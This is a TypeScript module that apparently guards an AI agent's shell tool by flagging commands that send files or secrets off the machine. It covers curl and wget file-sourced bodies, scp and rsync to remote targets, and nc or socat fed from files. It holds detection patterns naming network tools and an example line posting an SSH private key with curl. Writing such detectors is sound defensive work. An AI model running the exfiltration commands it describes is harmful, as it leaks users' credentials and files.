/**
 * Credential-exfiltration floor for shell commands (issue #28, P1a).
 *
 * A command is exfiltration when ONE subcommand sends data off the machine
 * AND that data comes from a file or secret:
 *
 *  - `curl`/`wget` with a file-sourced body or header: `-d @f`,
 *    `--data(-binary|-raw|-urlencode|-ascii) @…`, `--data-urlencode name@f`,
 *    `--json @…`, `-F x=@…` / `-F x=<…`, `-H @f`, `-T` / `--upload-file`,
 *    `--post-file` / `--body-file` (also `-e post_file=…`), or any argument
 *    (URL included) built from a `$(…)` that reads a path;
 *  - `scp` / `rsync` whose destination is remote, and `sftp` to a remote host;
 *  - `nc` / `ncat` / `netcat` / `socat` fed from a file redirect, a
 *    here-string that reads a path, a `FILE:`/`OPEN:`/`EXEC:` address, or an
 *    earlier pipeline stage that reads a path (`cat`/`base64`/`tar`/… <path>);
 *  - any argument of a sender (or of a stage feeding it) that resolves to a
 *    sensitive path (`sensitive-paths.ts`).
 *
 * Senders are recognized through wrappers (`exec`, `env`, `timeout`,
 * `busybox`, …) and inside static `sh -c '…'`, `eval '…'` and here-documents
 * fed to a shell. The check applies to the whole compound command:
 * `ls; curl -d @~/.ssh/id_rsa x` is exfiltration. Plain `curl`/`wget` GETs,
 * form fields without `@`, local `rsync`, `scp` downloads and `git push` are
 * not.
 *
 * Consumers: the rule classifier grades a match HIGH (once-only at the gate),
 * the rule matcher never allows it, and `PermissionManager.checkDetailed`
 * forces a per-call ask in every mode (the floor).
 */
import { homedir } from "node:os";
import { isAbsolute, resolve } from "node:path";
import {
  analyzeShell,
  type ShellCommand,
  type ShellStatement,
  type ShellWord,
} from "../../shared/shell-analysis.js";
import { canonicalizePathForMatch, caseFoldForMatch, isSensitivePath } from "../sensitive-paths.js";
import { SHELL_PREFIX_POLICY, isShellWrapperProgram } from "./shell-prefix-policy.js";

const PATH_READERS = new Set([
  "cat", "tac", "base64", "base32", "tar", "gzip", "bzip2", "xz", "zstd", "zip", "xxd", "od", "hexdump",
  "openssl", "gpg", "head", "tail", "dd", "less", "more", "strings", "cut", "sed", "awk", "jq",
]);
const SOCKET_SENDERS = new Set(["nc", "ncat", "netcat", "socat"]);
const SHELLS = new Set(SHELL_PREFIX_POLICY.shells);
const CURL_BOOLEAN_SHORT = /^[sSfLkviIlnNqgGjJORZpaBM0-9]*$/;
const CURL_DATA_LONG = ["--data", "--data-binary", "--data-raw", "--data-urlencode", "--data-ascii", "--json"];
// `--form-string` sends its value literally (no `@` file read).
const CURL_FORM_LONG = ["--form"];
const CURL_HEADER_LONG = ["--header", "--proxy-header"];
const CURL_UPLOAD_LONG = ["--upload-file"];
const WGET_FILE_BODY = ["--post-file", "--body-file"];
const WGET_DATA_BODY = ["--post-data", "--body-data"];
const RECURSION_LIMIT = 4;

/** Fallback for input the grammar cannot parse: file-sourced curl/wget bodies only. */
const UNPARSED_FALLBACK = /\b(?:curl|wget)\b[^\n;&|]*\s(?:-[A-Za-z]*[dF]|--data(?:-binary|-raw|-urlencode|-ascii)?|--json|--form|-T|--upload-file|--post-file|--body-file)(?:=|\s+)?["']?[^\s"']*@/;

export const SHELL_EXFIL_VERDICT_REASON = "shell possible credential exfiltration";

function program(word: string | undefined): string | undefined {
  if (word === undefined) return undefined;
  return (word.split(/[\\/]/).pop() ?? word).replace(/\.exe$/i, "");
}

/**
 * `--flag` names one of `names`, exactly or as an unambiguous getopt-style
 * abbreviation (wget accepts `--post-f`; at least 8 characters so `--data`
 * style prefixes of unrelated options are not guessed).
 */
function isLongOption(flag: string, names: readonly string[]): boolean {
  return names.some((name) => name === flag || (flag.length >= 8 && name.startsWith(flag)));
}

/** Static text of a word, expanding a leading `~` (lowered to `$HOME`). */
function wordText(word: ShellWord): string | undefined {
  let text = "";
  for (const [index, part] of word.parts.entries()) {
    if (part.kind === "literal" || part.kind === "pattern") text += part.value;
    else if (part.kind === "parameter" && part.name === "HOME" && index === 0) text += homedir();
    else return undefined;
  }
  return text;
}

function substitutionBodies(word: ShellWord): ShellStatement[] {
  const bodies: ShellStatement[] = [];
  for (const part of word.parts) {
    if (part.kind === "substitution") bodies.push(part.body);
    else if (part.kind === "parameter-choice") bodies.push(...substitutionBodies(part.operand));
  }
  return bodies;
}

function commandsIn(statement: ShellStatement): ShellCommand[] {
  switch (statement.kind) {
    case "command": return [statement];
    case "sequence": case "pipeline": return statement.statements.flatMap(commandsIn);
    case "and": case "or": return [...commandsIn(statement.left), ...commandsIn(statement.right)];
    case "subshell": case "background": case "negate": case "redirected": case "function":
      return commandsIn(statement.body);
    case "for": case "while": return commandsIn(statement.body);
    case "if": return [...commandsIn(statement.condition), ...commandsIn(statement.consequent), ...commandsIn(statement.alternate)];
    default: return [];
  }
}

interface Context { cwd: string | undefined; depth: number }

function sensitiveArgument(text: string, ctx: Context): string | null {
  let candidate = text;
  const marker = /^(?:@|[^=]*=[@<]|(?:FILE|OPEN|GOPEN):)/i.exec(candidate);
  if (marker) candidate = candidate.slice(marker[0].length);
  if (!candidate || candidate === "-" || /^[a-z][a-z0-9+.-]*:\/\//i.test(candidate)) return null;
  if (!candidate.includes("/") && !candidate.startsWith(".")) return null;
  const absolute = isAbsolute(candidate) ? candidate : ctx.cwd ? resolve(ctx.cwd, candidate) : undefined;
  if (!absolute) return null;
  const hit = isSensitivePath(caseFoldForMatch(canonicalizePathForMatch(absolute)), "read");
  return hit ? `sensitive path argument (${hit})` : null;
}

/** argv with leading wrapper programs (and their options) and `busybox` removed. */
function unwrap(words: readonly ShellWord[]): readonly ShellWord[] {
  let rest = words;
  for (let guard = 0; guard < 8 && rest.length > 0; guard += 1) {
    const head = program(wordText(rest[0]!));
    if (head === undefined) return rest;
    if (head === "busybox") { rest = rest.slice(1); continue; }
    if (!isShellWrapperProgram(head) || head === "eval" || head === "source" || head === ".") return rest;
    rest = rest.slice(1);
    while (rest.length > 0) {
      const next = wordText(rest[0]!);
      if (next !== undefined && (next.startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(next) || /^\d+(?:\.\d+)?[smhd]?$/.test(next))) {
        rest = rest.slice(1);
        continue;
      }
      break;
    }
  }
  return rest;
}

/** A command that reads a named path (a pipeline feeder or substitution body). */
function readsPath(cmd: ShellCommand): boolean {
  const words = unwrap(cmd.words);
  const name = program(words[0] ? wordText(words[0]) : undefined);
  if (!name || !PATH_READERS.has(name)) return false;
  if (cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target)) return true;
  return words.slice(1).some((word) => {
    const text = wordText(word);
    return text === undefined || !text.startsWith("-");
  });
}

function bodiesReadPath(words: readonly ShellWord[]): boolean {
  return words.flatMap(substitutionBodies).flatMap(commandsIn).some((cmd) => cmd.words.length > 0 && readsPath(cmd));
}

function isRemoteTarget(text: string | undefined): boolean {
  if (text === undefined) return false;
  if (/^(?:rsync|scp|sftp):\/\//i.test(text)) return true;
  if (text.startsWith("/") || text.startsWith(".") || /^[A-Za-z]:[\\/]/.test(text)) return false;
  return /^(?:[^\s/@:]+@)?[A-Za-z0-9._-]+:/.test(text) && !/^[a-z][a-z0-9+.-]*:\/\//i.test(text);
}

function curlSignal(args: readonly ShellWord[]): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    let flag: string | undefined;
    let valueText: string | undefined;
    let valueWord: ShellWord | undefined;
    const long = /^(--[a-z-]+)(?:=([\s\S]*))?$/.exec(raw);
    if (long) {
      flag = long[1];
      if (long[2] !== undefined) { valueText = long[2]; valueWord = word; }
      else if (args[index + 1]) { valueWord = args[index + 1]; valueText = wordText(valueWord); }
    } else if (/^-[A-Za-z]/.test(raw)) {
      const letters = raw.slice(1);
      const at = letters.search(/[dFTH]/);
      // Only boolean flags may precede it in a cluster; after a value-taking
      // flag (`-XPOST`, `-ofile`) the rest of the word is that flag's value.
      if (at === -1 || !CURL_BOOLEAN_SHORT.test(letters.slice(0, at))) continue;
      flag = `-${letters[at]}`;
      if (at === letters.length - 1) {
        valueWord = args[index + 1];
        valueText = valueWord ? wordText(valueWord) : undefined;
      } else {
        valueText = letters.slice(at + 1);
        valueWord = word;
      }
    }
    if (!flag) continue;
    const dataFlag = flag === "-d" || isLongOption(flag, CURL_DATA_LONG);
    const formFlag = flag === "-F" || isLongOption(flag, CURL_FORM_LONG);
    const headerFlag = flag === "-H" || isLongOption(flag, CURL_HEADER_LONG);
    const uploadFlag = flag === "-T" || isLongOption(flag, CURL_UPLOAD_LONG);
    if (uploadFlag && (valueWord || valueText)) return "curl upload of a file";
    const fromSubstitution = valueWord !== undefined && bodiesReadPath([valueWord]);
    // `--data-urlencode name@file` also reads a file.
    const urlencodeFile = flag.startsWith("--data-urlenc") && /^[^=@]*@/.test(valueText ?? "");
    if (dataFlag && (valueText?.startsWith("@") || urlencodeFile || fromSubstitution)) return "curl body from a file";
    if (formFlag && (/=[@<]/.test(valueText ?? "") || fromSubstitution)) return "curl form field from a file";
    if (headerFlag && valueText?.startsWith("@")) return "curl header from a file";
  }
  return null;
}

function wgetSignal(args: readonly ShellWord[]): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    if (/^-e\s*(?:post|body)_?file\s*=|^--execute=(?:post|body)_?file\s*=/i.test(raw)) return "wget body from a file";
    if ((raw === "-e" || raw === "--execute") && /^(?:post|body)_?file\s*=/i.test(wordText(args[index + 1] ?? word) ?? "")) {
      return "wget body from a file";
    }
    const flag = raw.split("=")[0]!;
    if (!flag.startsWith("--")) continue;
    if (isLongOption(flag, WGET_FILE_BODY)) return "wget body from a file";
    if (isLongOption(flag, WGET_DATA_BODY)) {
      const valueWord = raw.includes("=") ? word : args[index + 1];
      if (valueWord && bodiesReadPath([valueWord])) return "wget body from a file";
    }
  }
  return null;
}

/** Code a shell or `eval` runs from a static string (`sh -c '…'`, `eval '…'`). */
function inlineShellCode(name: string, args: readonly ShellWord[]): string | undefined {
  if (name === "eval") {
    const texts = args.map(wordText);
    return texts.every((text) => text !== undefined) ? texts.join(" ") : undefined;
  }
  if (!SHELLS.has(name)) return undefined;
  const flagIndex = args.findIndex((arg) => /^-[A-Za-z]*c[A-Za-z]*$/.test(wordText(arg) ?? ""));
  if (flagIndex === -1) return undefined;
  const code = args[flagIndex + 1];
  return code ? wordText(code) : undefined;
}

function senderSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: Context): string | null {
  const words = unwrap(cmd.words);
  const name = program(words[0] ? wordText(words[0]) : undefined);
  if (!name) return null;
  const args = words.slice(1);

  if (ctx.depth < RECURSION_LIMIT) {
    const code = inlineShellCode(name, args);
    if (code !== undefined) {
      const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1 });
      if (nested) return nested;
    }
    if (SHELLS.has(name)) {
      for (const redirect of cmd.redirects) {
        const script = redirect.effect === "read" && redirect.data ? wordText(redirect.data) : undefined;
        const nested = script === undefined ? null : signalFor(script, { ...ctx, depth: ctx.depth + 1 });
        if (nested) return nested;
      }
    }
  }

  let signal: string | null = null;
  let isSender = false;
  if (name === "curl") { isSender = true; signal = curlSignal(args); }
  else if (name === "wget") { isSender = true; signal = wgetSignal(args); }
  else if (name === "scp" || name === "rsync") {
    isSender = true;
    const positional = args.map(wordText).filter((text) => text === undefined || !text.startsWith("-"));
    if (positional.length >= 2 && isRemoteTarget(positional[positional.length - 1])) signal = `${name} to a remote target`;
  } else if (name === "sftp") {
    isSender = true;
    if (args.map(wordText).some((text) => text !== undefined && !text.startsWith("-") && (isRemoteTarget(text) || /^[^\s/@:]+@[A-Za-z0-9._-]+$/.test(text)))) {
      signal = "sftp to a remote target";
    }
  } else if (SOCKET_SENDERS.has(name)) {
    isSender = true;
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target || (redirect.data && bodiesReadPath([redirect.data]))))) {
      signal = `${name} fed from a file`;
    } else if (feeders.some(readsPath)) {
      signal = `${name} fed from a file`;
    } else if (name === "socat" && args.map(wordText).some((text) => text !== undefined && /^(?:FILE|OPEN|GOPEN|EXEC|SYSTEM):/i.test(text))) {
      signal = "socat file or command address";
    }
  }
  if (!isSender) return null;
  if (signal) return signal;
  // Any argument (the URL included) built from a substitution that reads a
  // path carries file data off the machine.
  if ((name === "curl" || name === "wget") && bodiesReadPath(args)) return `${name} argument built from a file`;
  // curl/wget send stdin only with `@-` / `-T -`, which the checks above
  // already match; a feeder alone is not a body.
  for (const word of [...args, ...feeders.flatMap((feeder) => feeder.words.slice(1))]) {
    const text = wordText(word);
    const hit = text === undefined ? null : sensitiveArgument(text, ctx);
    if (hit) return hit;
  }
  return null;
}

function walk(statement: ShellStatement, ctx: Context): string | null {
  switch (statement.kind) {
    case "command": {
      const own = statement.words.length > 0 ? senderSignal(statement, [], ctx) : null;
      if (own) return own;
      const words = [
        ...statement.words,
        ...statement.assignments.flatMap((assignment) => [assignment.value, ...(assignment.elements ?? [])]),
        ...statement.redirects.flatMap((redirect) => [redirect.target, redirect.data].filter((word): word is ShellWord => word !== undefined)),
      ];
      for (const body of words.flatMap(substitutionBodies)) {
        const nested = walk(body, ctx);
        if (nested) return nested;
      }
      return null;
    }
    case "pipeline": {
      const stages = statement.statements;
      for (let index = 0; index < stages.length; index += 1) {
        const stage = stages[index]!;
        if (stage.kind === "command" && stage.words.length > 0) {
          const feeders = stages.slice(0, index).flatMap(commandsIn);
          const signal = senderSignal(stage, feeders, ctx);
          if (signal) return signal;
        }
        const nested = walk(stage, ctx);
        if (nested) return nested;
      }
      return null;
    }
    case "sequence":
      for (const child of statement.statements) {
        const nested = walk(child, ctx);
        if (nested) return nested;
      }
      return null;
    case "and": case "or":
      return walk(statement.left, ctx) ?? walk(statement.right, ctx);
    case "subshell": case "background": case "negate": case "redirected": case "function":
      return walk(statement.body, ctx);
    case "for": case "while":
      return walk(statement.body, ctx) ?? (statement.kind === "while" ? walk(statement.condition, ctx) : null);
    case "if":
      return walk(statement.condition, ctx) ?? walk(statement.consequent, ctx) ?? walk(statement.alternate, ctx);
    default:
      return null;
  }
}

function signalFor(command: string, ctx: Context): string | null {
  let analysis: ReturnType<typeof analyzeShell>;
  try {
    analysis = analyzeShell(command, "bash");
  } catch {
    analysis = { ok: false, reason: "shell parser failed" };
  }
  if (!analysis.ok) return UNPARSED_FALLBACK.test(command) ? "curl/wget body from a file (unparsed)" : null;
  return walk(analysis.program, ctx);
}

/**
 * The exfiltration signal for a shell command, or `null`. `cwd` resolves
 * relative path arguments for the sensitive-path check.
 */
export function shellExfiltrationSignal(command: string, cwd?: string): string | null {
  return signalFor(command, { cwd, depth: 0 });
}
